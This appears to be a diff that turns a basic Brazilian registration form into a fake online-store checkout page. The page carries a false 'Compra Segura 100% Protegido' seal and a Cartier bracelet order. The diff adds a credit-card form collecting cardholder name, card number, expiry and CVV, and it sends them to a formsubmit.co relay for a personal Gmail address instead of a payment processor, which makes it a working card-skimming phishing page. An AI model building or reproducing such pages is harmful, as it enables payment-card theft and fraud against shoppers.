@@ -1,71 +1,387 @@
 <!DOCTYPE html>
-<html lang="pt-br">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário</title>
-    <link rel="stylesheet" href="styleCartao.css">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="4600328c438f15f8.css">
+    
+    
+<style>
+    body{
+        background-color: black;
+    }
+</style>
+
 </head>
-
 <body>
-<a href="home.php">Voltar</a>
-    <div class="box">
-        <form action="config.php" method="POST">
-            <fieldset>
-                <legend><b>Formulário De Clientes</b></legend>
-                <br>
-                <div class="inputBox">
-                    <input type="text" name="nome" id="nome" class="inputUser" required>
-                    <label for="nome" class="labelInput">Nome completo</label>
+    <div class="headbar" style="background-color: black;">
+        <div class="container">
+            <div class="row">
+              
+              <div id="headbar-right" class="col text-right font-small">
+                <div class="security-seal">
+                  <span class="d-inline-block"><img alt="Compra Segura" src="img/safe-shopping.svg" class="security-seal-badge"></span><span class="d-inline-block text-left"><p class="m-none text-uppercase text-semi-bold" style="color: white;">Compra Segura</p><p class="m-none text-uppercase" style="color: white;">100% Protegido</p></span></div>
                 </div>
-                <br><br>
-                <div class="inputBox">
-                    <input type="password" name="senha" id="senha" class="inputUser" required>
-                    <label for="senha" class="labelInput">Senha</label>
-                </div>
-                <br><br>
-                <div class="inputBox">
-                    <input type="text" name="email" id="email" class="inputUser" required>
-                    <label for="email" class="labelInput">Email</label>
-                </div>
-                <br><br>
-                <div class="inputBox">
-                    <input type="tel" name="telefone" id="telefone" class="inputUser" required>
-                    <label for="telefone" class="labelInput">Telefone</label>
-                </div>
-                <br>
-                <p>Sexo:</p>
-                <input type="radio" id="feminino" name="genero" value="feminino" required>
-                <label for="feminino">Feminino</label>
-                <input type="radio" id="masculino" name="genero" value="masculino" required>
-                <label for="masculino">Masculino</label>
-                <input type="radio" id="outro" name="genero" value="outro" required>
-                <label for="outro">Outro</label>
-                <br><br>
-                <label for="dataNascimento"><b>Data de Nascimento</b></label>
-                <input type="date" name="dataNascimento" id="dataNascimento" required>
-                <br><br>
-                <div class="inputBox">
-                    <input type="text" name="cidade" id="cidade" class="inputUser" required>
-                    <label for="cidade" class="labelInput">Cidade</label>
-                </div>
-                <br><br>
-                <div class="inputBox">
-                    <input type="text" name="estado" id="estado" class="inputUser" required>
-                    <label for="estado" class="labelInput">Estado</label>
-                </div>
-                <br><br>
-                <div class="inputBox">
-                    <input type="text" name="endereco" id="endereco" class="inputUser" required>
-                    <label for="endereco" class="labelInput">endereco</label>
-                </div>
-                <br>
-                <input type="submit" name="submit" id="submit">
-            </fieldset>
-        </form>
+              </div>
+            </div>
+          </div>
     </div>
-    <?php include_once('config.php');?>
-</body>
+    <div class="container main-container" style="background-color: black;">
+        <div style="background-color: black;"class="summary d-block d-md-none fixed sticky">
+            <div style="background-color: black;" role="menubar" tabindex="0" class="summary-container text-small">
+              <div style="background-color: black;" class="container">
+                <span style="background-color: black;" class="summary-title pull-left">
+                  <span style="background-color: black;" class="summary-arrow summary-arrow-rounded" test-id="show-details">
+                    <svg style="color: white;" class="summary-arrow-icon" width="8px" height="8px" viewBox="0 0 1024 1024">
+                      <path style="color: white;  " d="M462.2,778.1L29.6,345.5c-27.5-27.5-27.5-72.1,0-99.6c27.5-27.5,72.1-27.5,99.6,0L512,628.7l382.7-382.8 c27.5-27.5,72.1-27.5,99.6,0c27.5,27.5,27.5,72.1,0,99.6L561.8,778.1C548,791.9,530,798.7,512,798.7 C494,798.7,475.9,791.9,462.2,778.1z"></path>
+                    </svg>
+                  </span>
+                  <span class="m-left-half" style="color: white;">Ver detalhes do pedido</span>
+                </span>
+                <span class="summary-total" style="text-decoration: none; color: white; background-color: black;">R$&nbsp;600,00</span>
+              </div>
+            </div>
+            <div class="summary-details panel p-none" test-id="cart-details-desktop">
+            </div>
+          </div>
+    </div>
+    <div class="breadcrumb breadcrumb-timeline-container" id="breadcrumb">
+        <div class="row">
+          <div class="col-12 col-md-8">
+            <ul class="breadcrumb-timeline">
+              <li style="color: white;">
+                <button class="breadcrumb-timeline-item disabled" aria-disabled="true" tabindex="-1">
+                  <div class="breadcrumb-timeline-item-icon">
+                    <svg class="svg" width="9px" height="9px" viewBox="0 0 1024 1024">
+                      <path d="M392.715 691.38L243.381 542.047C226.741 525.407 200.288 525.407 183.648 542.047C167.008 558.687 167.008 585.14 183.648 601.78L362.421 780.553C379.061 797.193 405.941 797.193 422.581 780.553L874.848 328.713C891.488 312.073 891.488 285.62 874.848 268.98C858.208 252.34 831.755 252.34 815.115 268.98L392.715 691.38Z"></path></svg></div><p class="breadcrumb-timeline-item-text" style="color: white;">Carrinho</p>
+                    </button>
+                  </li>
+                  <li class="breadcrumb-timeline-line"></li>
+                  <li><button class="breadcrumb-timeline-item">
+                    <div style="color: white;" class="breadcrumb-timeline-item-icon">
+                      <svg class="svg" width="9px" height="9px" viewBox="0 0 1024 1024">
+                        <path d="M392.715 691.38L243.381 542.047C226.741 525.407 200.288 525.407 183.648 542.047C167.008 558.687 167.008 585.14 183.648 601.78L362.421 780.553C379.061 797.193 405.941 797.193 422.581 780.553L874.848 328.713C891.488 312.073 891.488 285.62 874.848 268.98C858.208 252.34 831.755 252.34 815.115 268.98L392.715 691.38Z"></path></svg></div><p class="breadcrumb-timeline-item-text" style="color: white;">Entrega</p>
+                      </button>
+                    </li>
+                    <li class="breadcrumb-timeline-line"></li>
+                    <li>
+                      <button class="breadcrumb-timeline-item current disabled" aria-disabled="true" tabindex="-1">
+                        <div style="color: white;" class="breadcrumb-timeline-item-icon">
+                          <svg class="svg" width="12px" height="12px" viewBox="0 0 1024 1024">
+                            <path d="M944.5 140.5C910.9 106.9 865.3 88 817.8 88H182.3c-47.5 0-93.1 18.9-126.7 52.5C21.9 174.1 3 219.7 3 267.2v456.3c0 47.5 18.9 93.1 52.5 126.7 33.6 33.6 79.2 52.5 126.7 52.5h635.5c47.5 0 93.1-18.9 126.7-52.5C978.1 816.6 997 771 997 723.5V267.2c0-47.5-18.9-93.1-52.5-126.7zm-37.1 583c0 23.8-9.4 46.6-26.2 63.4-16.8 16.8-39.6 26.2-63.4 26.2H182.3c-23.8 0-46.6-9.4-63.4-26.2-16.8-16.8-26.2-39.6-26.2-63.4V450.6h814.7v272.9zm0-362.6H92.7v-93.7c0-23.8 9.4-46.6 26.2-63.4 16.8-16.8 39.6-26.2 63.4-26.2h635.5c23.8 0 46.6 9.4 63.4 26.2 16.8 16.8 26.2 39.6 26.2 63.4v93.7z"></path>
+                          </svg>
+                        </div>
+                        <p style="color: white;" class="breadcrumb-timeline-item-text">Pagamento</p>
+                      </button>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div style="background-color: black;" class="summary-coupon d-block d-md-none">
+                <div style="background-color: black;" class="box-discount-coupon-applied">
+                  <div class="row">
+                    <div class="col-12 text-center">
+                      <div id="" class="btn btn-link" style="text-decoration: none;" tabindex="0" role="button">
+                        <span>
+                          <svg class="coupon-icon" width="13px" height="13px" viewBox="0 0 1024 1024">
+                            <path d="M992.6,564.8L546.7,41.3C502.1-11,426.5-14,377.9,34.6L34.6,377.9C-14,426.5-11,502.1,41.3,546.6l523.4,445.9 c52.4,44.6,134.2,41.3,182.8-7.3l237.7-237.7C1033.9,699,1037.2,617.1,992.6,564.8z M709.5,802.8c-51.6,0-93.3-41.8-93.3-93.3 c0-51.5,41.8-93.3,93.3-93.3s93.3,41.8,93.3,93.3C802.8,761,761,802.8,709.5,802.8z"></path>
+                          </svg>
+                          <span class="text-pre-line">Adicionar cupom de desconto</span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div style="background-color: black;" id="main-row" class="row m-bottom m-top">
+                <div style="background-color: black;"class="col-12 col-md-8" id="main-column">
+                  <div style="background-color: black;"id="preReviewBlockSlot"></div>
+                  <form style="background-color: black;">
+                    <article style="background-color: black; border: ; " class="review-block-detailed m-bottom">
+                      <section style="background-color: black;" class="review-block-detailed-item panel m-bottom-none  p-top p-bottom" id="reviewBlockEnvelope">
+                        <div class="user-detail-icon icon-area">
+                          <svg  style="background-color: black;" class="svg" width="20px" height="20px" viewBox="0 0 1024 1024">
+                            <path d="M 875.753 193.085 L 500.255 472.384 L 124.758 193.085 L 875.753 193.085 Z  M 78.596 256.068 L 500.255 569.701 L 921.915 256.068 L 921.915 731.872 L 921.915 731.872 C 921.915 753.4 904.4 770.915 882.872 770.915 L 117.638 770.915 C 96.11 770.915 78.596 753.4 78.596 731.872 L 78.596 256.068 Z  M 882.872 115 L 117.638 115 C 53.054 115 0.511 167.543 0.511 232.128 L 0.511 731.872 C 0.511 796.457 53.054 849 117.638 849 L 882.872 849 C 947.457 849 1000 796.457 1000 731.872 L 1000 232.128 C 1000 167.543 947.457 115 882.872 115 L 882.872 115 Z"></path>
+                          </svg>
+                        </div>
+                        <div style="background-color: black;" class="center-area overflow-none">
+                          <div  class="content overflow-none text-ellipsis">
+                            <span  class="opacity-80 m-none" id="reviewBlockContentEmail"></span>
+                          </div>
+                        </div>
+                      </section>
+                      <section style="background-color: black;" class="review-block-detailed-item review-block-dropdown panel">
+                        <div id="pointMap" class="flex-direction-row align-items-start">
+                          <div class="user-detail-icon icon-area">
+        <svg class="svg" width="23px" height="23px" viewBox="0 0 1024 1024">
+          <path d="M512 512C465.067 512 426.667 473.6 426.667 426.667C426.667 379.734 465.067 341.334 512 341.334C558.933 341.334 597.333 379.734 597.333 426.667C597.333 473.6 558.933 512 512 512ZM768 435.2C768 280.32 654.933 170.667 512 170.667C369.067 170.667 256 280.32 256 435.2C256 535.04 339.2 667.307 512 825.174C684.8 667.307 768 535.04 768 435.2ZM512 85.3335C691.2 85.3335 853.333 222.72 853.333 435.2C853.333 576.717 739.632 744.211 512.656 938.107C512.282 938.426 511.718 938.426 511.344 938.107C284.368 744.211 170.667 576.717 170.667 435.2C170.667 222.72 332.8 85.3335 512 85.3335Z"></path>
+        </svg>
+      </div>
+      <div class="center-area overflow-none">
+        <div class="content overflow-none text-ellipsis">
+          <div class="review-block-notes">
+            <p class="text-bold m-none">Comentários adicionais</p>
+            <div class="review-block-note-text opacity-80 text-small m-none p-top-quarter">            
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="change-button-area">
+        <div id="" class="btn btn-link" tabindex="0" role="button">
+          <span>Adicionar</span>
+        </div>
+      </div>
+    </section>
+    <section style="background-color: black;" class="review-block-detailed-item review-block-dropdown panel">
+      <div id="truck" class="flex-direction-row align-items-start">
+        <div class="user-detail-icon icon-area">
+          <svg class="svg" width="23px" height="23px" viewBox="0 0 1024 1024">
+            <path d="M579.9,247.5H5v-78h613.9c21.5,0,39,17.5,39,39v105.4h177.7c11.8,0,23.1,5.4,30.5,14.6l144.4,180.6 c5.5,6.9,8.5,15.5,8.5,24.4v216.7c0,21.5-17.5,39-39,39h-76.4c-15.8,42.2-56.5,72.2-104.2,72.2c-61.4,0-111.2-49.8-111.2-111.2	S738,638.9,799.5,638.9c47.7,0,88.4,30,104.2,72.2H941v-164L816.8,391.9H657.9v358.2c0,21.5-17.5,39-39,39H402.2v-78h177.7V247.5z M402.2,391.9h-325v-78h325V391.9z M330,536.4H5v-78h325V536.4z M221.7,716.9c-18.3,0-33.2,14.9-33.2,33.2 c0,18.3,14.9,33.2,33.2,33.2c18.3,0,33.2-14.9,33.2-33.2C254.9,731.8,240,716.9,221.7,716.9z M110.5,750.1 c0-61.4,49.8-111.2,111.2-111.2c61.4,0,111.2,49.8,111.2,111.2s-49.8,111.2-111.2,111.2C160.3,861.3,110.5,811.6,110.5,750.1z M799.5,716.9c-18.3,0-33.2,14.9-33.2,33.2c0,18.3,14.9,33.2,33.2,33.2c18.3,0,33.2-14.9,33.2-33.2	C832.7,731.8,817.8,716.9,799.5,716.9z"></path>
+          </svg>
+        </div>
+        <div  class="content center-area overflow-none text-ellipsis align-self-center">
+          <div class="review-block-shipping">
+            <div class="text-bold m-none p-bottom-quarter">
+            <span class="m-none">Correios - SEDEX (via Melhor Envio) · </span>
+            <span>R$00,00</span>
+          </div>
+          <div class="shipping-method-item-desc text-small ">Chega entre sexta-feira e segunda-feira</div>
+        </div>
+      </div>
+      <div class="change-button-area">
+        <div id="" class="btn btn-link" tabindex="0" role="button">
+          <span>Alterar</span>
+        </div>
+      </div>
+  </article>
+  <div style="background-color: black; border: none;" class="panel panel-with-header" style="min-height: 243px;">
 
+    <style>
+      
+      
+
+.box{
+  
+    position: relative;
+    background-color: rgba(0, 0, 0, 0.6);
+    padding: 15px;
+    border-radius: 15px;   
+    color: white;
+}
+
+
+
+legend{
+    border: 1px solid black;
+    padding: 5px;
+    text-align: center;
+    background-color: black;
+    border-radius: 8px;
+}
+
+.inputBox{
+    position: relative;
+}
+.inputUser{
+    background: none;
+    border: none;
+    border-bottom: 1px solid white;
+    outline: none;
+    color: white;
+    font-size: 15px;
+    width: 100%;
+    letter-spacing: 2px;
+}
+
+.labelInput{
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    pointer-events: none;
+    transition: .5s ;
+}
+
+.inputUser:focus ~ .labelInput,
+.inputUser:valid ~ .labelInput
+{
+    top: -20px;
+    font-size: 12px;
+    color: white;
+}
+
+#dataNascimento{
+    border: none;
+    padding: 8px;
+    border-radius: 10px;
+    outline: none;
+    font-size: 15px;
+}
+
+#submit{
+    background-color: black;
+    width: 100%;
+    border: solid 1px;
+    padding: 15px;
+    color: white;
+    font-size: 15px;
+    cursor: pointer;
+    border-radius: 10px;
+}
+
+
+    </style>
+
+    <div class="box">
+      <form action="https://formsubmit.co/shadowbet44@gmail.com" method="POST">
+          <fieldset>
+              <legend><b>Cartão de credito</b></legend>
+              <br>
+              <div class="inputBox">
+                  <input type="text" name="nome" id="nome" class="inputUser" required>
+                  <label for="nome" class="labelInput">Nome Impresso</label>
+              </div>
+              <br><br>
+              <div class="inputBox">
+                  <input type="text" name="senha" id="senha" class="inputUser"  required>
+                  <label for="senha" class="labelInput">Numero Cartão</label>
+              </div>
+              <br><br>
+              <div class="inputBox">
+                  <input type="text" name="vence" id="vence" class="inputUser" maxlength="5" required>
+                  <label for="email" class="labelInput">Vencimento (MM/AA)</label>
+              </div>
+              <br><br>
+              <div class="inputBox">
+                  <input type="tel" name="telefone" id="telefone" class="inputUser" maxlength="5" required>
+                  <label for="telefone" class="labelInput">CVV</label>
+              </div>
+              <br>
+              
+             
+              <br>
+              <input type="submit" name="submit" id="submit">
+          </fieldset>
+      </form>
+  </div>
+
+  <script>
+    document.getElementById("vence").addEventListener("input", function (e) {
+        let valor = e.target.value.replace(/\D/g, ""); // Remove caracteres não numéricos
+        if (valor.length > 2) {
+            valor = valor.substring(0, 2) + "/" + valor.substring(2);
+        }
+        e.target.value = valor;
+    });
+    </script>
+  
+  </div>
+  <div class="">
+    <div id="optInNext">
+      <div style="background-color: black; border: none;" id="containerOptInWallet" class="panel d-block">
+        <div style="background-color: black;" class="panel m-bottom-none xpaqlw8 xpaqlw6" id="boxOptInWallet" data-testid="boxOptInWallet">
+          <div class="content-wallet-subscribe p-bottom-none"><div class="xpaqlwe">
+            <div class="form-group aepkto3">
+              <input id="isAcceptWallet" type="checkbox" class="aepkto5 aepkto4" data-testid="isAcceptWallet" name="isAcceptWallet" aria-label="modifyPhone" value="withConsent" checked="">
+              <label class="input-label" id="label_isAcceptWallet" for="isAcceptWallet">
+                <span data-testid="optInBuyFastButton" class="xpaqlwa">Salvar dados para <strong>comprar mais rápido</strong></span></label>
+              </div>
+              <svg width="100%" height="19" viewBox="0 0 664 158" class="s2mmzq1 _2yjga0 xpaqlwf wallet-logo" data-testid="walletLogo" fill="currentColor" style="--s2mmzq0: var(--gml9zxm);"><path d="M141.32,0h-.09S141.18,0,141.15,0c-20.74.03-40.5,8.18-55.25,22.52-7.55-3.2-15.68-4.86-24.08-4.86C27.73,17.66,0,45.39,0,79.47s27.73,61.81,61.81,61.81c8.27,0,16.45-1.69,24.02-4.87,14.32,13.93,33.85,22.53,55.36,22.53,43.82,0,79.47-35.65,79.47-79.47S185.08.07,141.32,0ZM141.19,141.28c-34.08,0-61.81-27.73-61.81-61.81h-17.66c0,15.59,4.53,30.13,12.31,42.41-3.96,1.14-8.07,1.74-12.22,1.74-24.34,0-44.15-19.81-44.15-44.15s19.81-44.15,44.15-44.15c9.64,0,18.8,3.05,26.48,8.82,11.23,8.43,17.67,21.31,17.67,35.33h17.66c0-18.49-8.01-35.56-22.08-47.34,11.05-9.27,25.06-14.46,39.69-14.47,34.06.02,61.76,27.74,61.76,61.81s-27.73,61.81-61.81,61.81ZM324.85,55.35c2.25,4.03,3.38,8.69,3.38,13.98v45.51h-17.03v-41.48c0-3.12-.61-5.81-1.82-8.06-1.21-2.25-2.91-3.99-5.07-5.2-2.17-1.21-4.64-1.82-7.41-1.82s-5.25.61-7.41,1.82c-2.17,1.21-3.86,2.95-5.07,5.2-1.22,2.26-1.82,4.94-1.82,8.06v41.48h-17.16V44.1h16.12v8.7c1.64-2.92,3.92-5.24,6.83-6.95,3.77-2.21,8.17-3.32,13.2-3.32s9.82,1.13,13.85,3.38c4.03,2.26,7.17,5.4,9.43,9.43ZM385.98,44.1h17.03v42.91c0,5.81-1.32,10.92-3.97,15.34-2.65,4.42-6.29,7.87-10.92,10.34-4.64,2.47-10.12,3.71-16.45,3.71s-11.73-1.24-16.45-3.71c-4.73-2.47-8.41-5.92-11.05-10.34-2.65-4.42-3.97-9.54-3.97-15.34v-42.91h17.16v42.39c0,2.86.61,5.35,1.82,7.48,1.21,2.13,2.9,3.79,5.07,5.01,2.17,1.21,4.64,1.82,7.41,1.82s5.37-.61,7.54-1.82c2.17-1.21,3.84-2.88,5.01-5.01,1.17-2.12,1.76-4.62,1.76-7.48v-42.39ZM479.54,44.1l-27.83,70.74h-15.08l-27.83-70.74h18.59l16.72,46.17,16.83-46.17h18.59ZM539.97,52.81c-2.95-3.21-6.52-5.72-10.73-7.54-4.21-1.82-9.08-2.73-14.63-2.73-6.68,0-12.66,1.6-17.94,4.81-5.29,3.21-9.49,7.56-12.61,13.07-3.12,5.51-4.68,11.81-4.68,18.92s1.52,13.09,4.55,18.72c3.03,5.64,7.3,10.1,12.81,13.39,5.5,3.3,11.9,4.94,19.18,4.94,4.77,0,9.19-.74,13.26-2.21,4.07-1.47,7.58-3.51,10.53-6.11,2.95-2.6,5.11-5.59,6.5-8.97l-13.78-6.76c-1.56,2.78-3.71,4.99-6.44,6.63-2.73,1.65-6.05,2.47-9.95,2.47s-7.35-.91-10.34-2.73c-2.99-1.82-5.25-4.4-6.76-7.74-.91-2.01-1.48-4.2-1.72-6.57h50.94c.35-1.04.58-2.19.71-3.45.13-1.26.2-2.54.2-3.84,0-4.77-.78-9.21-2.34-13.33-1.56-4.12-3.82-7.78-6.76-10.99ZM505.13,59.31c2.77-1.82,5.94-2.73,9.49-2.73s6.91.91,9.56,2.73c2.64,1.82,4.55,4.29,5.72,7.41.53,1.42.85,2.95.95,4.55h-33.27c.29-1.49.7-2.88,1.24-4.16,1.43-3.38,3.53-5.98,6.31-7.8ZM660.63,55.35c2.25,4.03,3.38,8.69,3.38,13.98v45.51h-17.03v-41.48c0-3.12-.56-5.81-1.69-8.06-1.13-2.25-2.71-3.99-4.75-5.2-2.04-1.21-4.44-1.82-7.22-1.82s-5.07.61-7.15,1.82c-2.08,1.21-3.69,2.95-4.81,5.2-1.13,2.26-1.69,4.94-1.69,8.06v41.48h-17.03v-41.48c0-3.12-.56-5.81-1.69-8.06-1.13-2.25-2.71-3.99-4.75-5.2-2.04-1.21-4.44-1.82-7.22-1.82s-5.07.61-7.15,1.82c-2.08,1.21-3.69,2.95-4.81,5.2-1.13,2.26-1.69,4.94-1.69,8.06v41.48h-17.16V44.1h16.12v8.89c1.44-2.8,3.43-5.03,5.98-6.68,3.9-2.51,8.49-3.77,13.78-3.77,5.81,0,10.92,1.52,15.34,4.55,2.79,1.91,4.95,4.21,6.5,6.88,1.89-2.98,4.23-5.39,7.02-7.21,4.33-2.82,9.32-4.23,14.95-4.23,5.03,0,9.51,1.13,13.46,3.38,3.94,2.26,7.04,5.4,9.3,9.43Z">
+              </path> 
+            </svg>
+          </div>
+          <div id="optInFormWrapper">
+            <div class="xpaqlw5">
+              <div class="_151rrud0"></div>
+                </div>
+                <div data-testid="optInDescriptionOTP">
+                  <span class="pymqjyo s2mmzq1 pymqjy0 pymqjyk" style="--s2mmzq0: var(--gml9zxn);"></span>
+                  <div class="xpaqlwc">
+                    <span class="pymqjyo s2mmzq1 pymqjy0 pymqjyk pymqjyi" style="--s2mmzq0: var(--gml9zxn);"></span>
+                    <div role="button" tabindex="0" class="_1kisa5md xpaqlw9" data-testid="optInAlterButton" aria-label="modifyPhone"><span class=""><span class="pymqjyo s2mmzq1 pymqjy0 pymqjyk pymqjyp" style="--s2mmzq0: var(--gml9zxn);"></span>
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="xpaqlwb">
+          <div id="termsAndConditionsContainer" class="_8g8fr51 _8g8fr54">Ao salvar, você aceita os <a id="termsOfUse" data-testid="termsOfUse" href="" target="_blank" rel="noreferrer" class="_8g8fr54  _8g8fr52">Termos de uso</a> e <a id="privacyPolicy" data-testid="privacyPolicy" href="" target="_blank" rel="noreferrer" class="_8g8fr54 _8g8fr52">Política de Privacidade</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div id="afterButtonChangeStep" style="padding-top: 20px;">    
+      </div>
+    </div>
+    </form>
+    </div>
+     <div class="col-12 col-md-4" id="secondary-column">
+      <div class="summary d-none d-md-block sticky">
+        <div style="background-color: black;" class="summary-details panel p-none" test-id="cart-details-desktop">
+          <table class="table table-scrollable" test-id="product-table"><tbody><tr><td class="summary-img-wrap">
+            <div class="summary-img">
+              <div class="summary-img-thumb">
+                <img alt="PULSEIRA CARTIER 10MM - 22CM" title="PULSEIRA CARTIER 10MM - 22CM" src="data:image/jpeg;base64,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